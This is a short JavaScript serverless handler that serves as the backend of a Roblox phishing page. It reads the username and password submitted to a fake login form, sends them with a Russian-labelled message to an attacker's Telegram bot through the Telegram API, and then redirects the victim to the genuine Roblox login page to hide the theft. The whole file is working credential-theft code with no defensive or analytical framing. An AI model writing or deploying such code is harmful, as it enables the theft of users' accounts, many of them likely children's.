exports.handler = async (event) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: 'Method Not Allowed' };
  }

  const params = new URLSearchParams(event.body);
  const user = params.get('username') || '';
  const pass = params.get('password') || '';
  
  const token = process.env.TG_TOKEN;
  const chat  = process.env.TG_CHAT;

  const text = `🔐 Roblox:\nЛогин: ${user}\nПароль: ${pass}`;

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chat, text: text })
  });

  return {
    statusCode: 302,
    headers: { Location: 'https://www.roblox.com/login' }
  };
};